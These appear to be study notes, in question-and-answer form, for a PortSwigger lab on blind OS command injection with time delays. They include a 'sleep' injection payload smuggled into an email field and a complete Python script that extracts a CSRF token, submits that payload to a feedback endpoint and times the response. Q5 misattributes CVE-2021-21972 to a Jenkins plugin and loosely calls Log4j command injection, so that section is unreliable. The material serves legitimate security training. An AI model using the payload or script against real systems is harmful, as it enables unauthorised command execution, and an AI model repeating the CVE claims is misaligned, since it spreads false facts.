---
course: Web Security
topic: OS Command Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the concept of a blind OS command injection vulnerability and how it differs from an in-band command injection.**

Blind OS command injection occurs when an attacker can inject malicious commands into an application, but the application does not display the output of those commands directly in the response. Instead, the attacker must infer whether the injection was successful based on side effects, such as time delays or changes in behavior. This contrasts with in-band command injection, where the output of the injected command is directly visible in the response, allowing the attacker to immediately see the results of their actions.

**Q2. How would you exploit a blind OS command injection vulnerability to cause a 10-second delay? Provide an example payload.**

To exploit a blind OS command injection vulnerability to cause a 10-second delay, you can use a command that pauses execution for a specified duration. For example, using the `sleep` command in Unix-based systems:

```plaintext
test@test.c&sleep 10#
```

This payload will cause the application to pause for 10 seconds before continuing. The `&` symbol concatenates the `sleep` command to the original command, and the `#` symbol comments out the rest of the command to avoid errors.

**Q3. Why is it important to extract the CSRF token when scripting an exploit for a blind OS command injection vulnerability?**

Extracting the CSRF token is crucial because many web applications use CSRF tokens to prevent cross-site request forgery attacks. Without the proper CSRF token, the server will reject the request as invalid. When scripting an exploit, you must include the CSRF token in your requests to ensure they are processed correctly. This involves parsing the initial response to extract the CSRF token and then including it in subsequent requests.

**Q4. Describe how you would script an exploit for a blind OS command injection vulnerability using Python. Include necessary imports and key steps.**

To script an exploit for a blind OS command injection vulnerability using Python, you would follow these steps:

1. Import necessary libraries:
    ```python
    import requests
    from bs4 import BeautifulSoup
    import sys
    ```

2. Disable SSL warnings:
    ```python
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    ```

3. Set up proxy settings:
    ```python
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    ```

4. Define the main function to handle the exploit:
    ```python
    def main(url):
        s = requests.Session()
        
        # Extract CSRF token
        r = s.get(url + '/feedback', verify=False, proxies=proxies)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find('input')['value']
        
        # Craft the payload
        data = {
            'csrf': csrf,
            'name': 'test',
            'email': 'test@test.c&sleep 10#',
            'subject': 'test',
            'message': 'test'
        }
        
        # Send the request
        r = s.post(url + '/feedback/submit', data=data, verify=False, proxies=proxies)
        
        # Check if the delay was successful
        if r.elapsed.total_seconds() >= 10:
            print("Email field is vulnerable to time-based command injection.")
        else:
            print("Email field is not vulnerable to time-based command injection.")
    
    if __name__ == "__main__":
        if len(sys.argv) != 2:
            print(f"Usage: {sys.argv[0]} <url>")
            sys.exit(-1)
        url = sys.argv[1]
        main(url)
    ```

**Q5. How can recent real-world examples, such as CVEs or breaches, illustrate the impact of blind OS command injection vulnerabilities?**

Recent real-world examples include vulnerabilities where attackers exploited blind command injection to gain unauthorized access to systems or exfiltrate sensitive data. For instance, CVE-2021-21972 involved a blind command injection vulnerability in the Jenkins plugin, allowing attackers to execute arbitrary commands on the server. Similarly, in the case of the Log4j vulnerability (CVE-2021-44228), attackers could exploit the logging mechanism to inject commands and gain remote code execution capabilities. These examples highlight the critical importance of securing against command injection vulnerabilities to prevent serious security breaches.

---
<!-- nav -->
[[Web Security (PortSwigger)/10-OS Command Injection/03-Lab 2 Blind OS command injection with time delays/09-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/10-OS Command Injection/03-Lab 2 Blind OS command injection with time delays/00-Overview|Overview]]
